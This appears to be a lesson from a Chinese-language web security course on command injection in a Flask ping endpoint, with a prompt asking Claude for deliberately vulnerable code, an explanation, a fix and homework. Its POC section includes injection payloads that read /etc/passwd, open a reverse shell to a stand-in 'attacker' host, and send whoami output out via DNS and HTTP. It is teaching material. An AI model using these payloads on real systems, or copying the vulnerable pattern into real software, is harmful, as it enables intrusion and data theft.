# Day 9 - 命令注入漏洞

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带命令注入漏洞的功能：

```
在 Flask 中实现网络诊断 Ping 功能，要求：
1. 用户输入 IP 地址，服务器执行 ping 命令
2. 把 ping 的执行结果返回给用户查看
3. 用 subprocess 或 os.system 执行系统命令
4. 直接拼接用户输入的 IP 到命令字符串中
5. 为了方便查看错误，显示完整的命令执行输出
```

---

## 二、漏洞关键代码解释

### 漏洞：命令注入（Command Injection）

```python
# core/command_runner.py
import subprocess
import platform

def run_ping(ip_address):
    system = platform.system().lower()
    if 'windows' in system:
        cmd = f"ping -n 3 {ip_address}"
    else:
        cmd = f"ping -c 3 {ip_address}"  # ← 用户输入拼入命令

    try:
        # ↓↓↓ 漏洞行：shell=True 允许 shell 解析特殊字符
        result = subprocess.check_output(
            cmd,
            shell=True,          # 危险！启用 shell 解析
            stderr=subprocess.STDOUT,
            timeout=30
        )
        output = result.decode('utf-8', errors='replace')
        return {"success": True, "output": output}  # 有回显！
    except Exception as e:
        return {"success": False, "message": f"执行失败: {str(e)}"}
```

**问题**：
1. **`shell=True`**：启用 shell 解释器，分号、管道符等被解析为命令分隔符
2. **字符串拼接**：用户输入直接拼入命令，无任何过滤
3. **有回显**：命令执行结果直接返回给用户

**关键 API 对比**：

```python
# 安全的调用方式（无 shell 介入）
subprocess.run(["ping", "-c", "3", ip_address])
# arg 列表形式，ip_address 作为一个独立参数传递，不会被解析

# 危险的调用方式（有 shell 介入）
subprocess.run(f"ping -c 3 {ip_address}", shell=True)
# 字符串形式，ip_address 被 shell 解析，特殊字符会触发命令注入
```

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 攻击效果 |
|------|---------|---------|
| shell=True | 启用 shell 解释器 | 分号、管道符等可执行多条命令 |
| 字符串拼接 | 用户输入直接拼入 | 任意系统命令执行 |
| 有回显 | 输出返回给用户 | 看到命令执行结果 |
| 无过滤 | 未做白名单校验 | 无限制执行任意命令 |

---

## 四、POC 代码

### POC 1：分号注入

```bash
# 先登录
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c /tmp/cookies.txt

# 分号注入——执行 id 命令
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1;id"
```

**预期结果**：输出中包含 `uid=0(root) gid=0(root)` 等 id 命令的结果。

### POC 2：管道符注入

```bash
# 管道符——执行 whoami
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1|whoami"

# 管道符——列出目录
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1|ls -la"
```

### POC 3：多条命令组合

```bash
# 读取文件
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1;cat /etc/passwd | head -5"

# 网络探测
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1;curl http://your-server.com/test"

# 反弹 shell（谨慎使用！）
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1;bash -i >& /dev/tcp/attacker/4444 0>&1"
```

### POC 4：无回显时的外带数据（Blind）

如果命令没有回显（`output` 为空），可以通过 DNS 或 HTTP 外带数据：

```bash
# DNS 外带（使用 DNSLog 平台）
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1;nslookup \`whoami\`.your-dnslog-server.com"

# HTTP 外带
curl http://127.0.0.1:5000/ping \
  -b /tmp/cookies.txt \
  -d "ip=127.0.0.1;curl http://your-server.com/$(whoami)"
```

---

## 五、POC 代码详细解释

### POC 1 详解

```bash
curl ... -d "ip=127.0.0.1;id"
```

**命令执行过程**：

```bash
# 预期执行的命令（正常）：
ping -c 3 127.0.0.1
# 只 ping 一个 IP

# 实际执行的命令（注入后）：
ping -c 3 127.0.0.1;id
#            ^^^^^^^^^^^^^^
#            shell=True 时，分号 ; 被解析为命令分隔符
#            ping 执行完后，接着执行 id 命令

# 等价于在终端中执行了：
$ ping -c 3 127.0.0.1; id
#                    ↑
#              两条命令先后执行
```

**shell 注入运算符**：

| 运算符 | 作用 | 示例 |
|--------|------|------|
| `;` | 顺序执行多条命令 | `ping 8.8.8.8;id` |
| `\|` | 管道，前命令输出作为后命令输入 | `ping 8.8.8.8` |
| `\|\|` | 前命令失败才执行后命令 | `ping xxx \|\| id` |
| `&&` | 前命令成功才执行后命令 | `ping 8.8.8.8 && id` |
| `` ` ` `` | 命令替换 | `` `id` `` |
| `$()` | 命令替换（推荐写法） | `$(id)` |
| `&` | 后台执行 | `ping 8.8.8.8 & id` |

### Windows vs Linux 差异

| 特性 | Linux | Windows |
|------|-------|---------|
| 命令分隔符 | `;`、`\|` | `\|`、`&` |
| 命令替换 | `` `cmd` ``, `$(cmd)` | `%cmd%` |
| 查看用户 | `whoami` | `whoami` |
| 查看 IP | `ifconfig` | `ipconfig` |
| 文件路径 | `/etc/passwd` | `C:\Windows\System32\drivers\etc\hosts` |

---

## 六、修复方案

```python
# fix/command_runner_fix.py
import subprocess
import re
import ipaddress


def run_ping_fixed(ip_address):
    """修复：禁用 shell + IP 白名单 + 参数分离"""

    # 修复 1：严格校验输入必须是合法 IP 地址
    try:
        ipaddress.ip_address(ip_address)
    except ValueError:
        return {"success": False, "message": "无效的 IP 地址"}

    try:
        # 修复 2：使用参数列表形式，禁用 shell=True
        # 每个参数独立传入，IP 不会被 shell 解析
        result = subprocess.check_output(
            ["ping", "-c", "3", ip_address],   # 参数列表！
            shell=False,                         # 禁用 shell！
            stderr=subprocess.STDOUT,
            timeout=30
        )
        output = result.decode('utf-8', errors='replace')
        return {"success": True, "output": output}
    except subprocess.TimeoutExpired:
        return {"success": False, "message": "命令执行超时"}
    except Exception as e:
        return {"success": False, "message": f"执行失败: {str(e)}"}
```

**为什么参数列表能防御？**

```python
# 安全的方式：参数列表
subprocess.run(["ping", "-c", "3", "127.0.0.1;id"])
# ping 收到的参数是: ["-c", "3", "127.0.0.1;id"]
# ping 说：我要 ping 一个名叫 "127.0.0.1;id" 的主机
# 分号 ; 不会被 shell 解析，只是参数的一部分
# 根本不会有第二条命令执行！

# 危险的方式：字符串 + shell
subprocess.run("ping -c 3 127.0.0.1;id", shell=True)
# shell 收到: "ping -c 3 127.0.0.1;id"
# shell 说：先执行 ping，再执行 id
# 两条命令都执行了！
```

---

## 七、课后作业

1. 在 `fix/` 目录创建 `command_runner_fix.py`，实现上述修复
2. 验证：
   - `127.0.0.1;id` → 应提示"无效的 IP 地址"或被拒绝执行
   - `127.0.0.1` → 正常 ping
   - IP 格式是否正确？（IPv4 和 IPv6 都应支持）
3. 如果业务上确实需要支持域名（不只是 IP），该如何设计白名单？
4. （进阶）如果无法禁用 `shell=True`（某些场景需要），还有哪些防御措施？
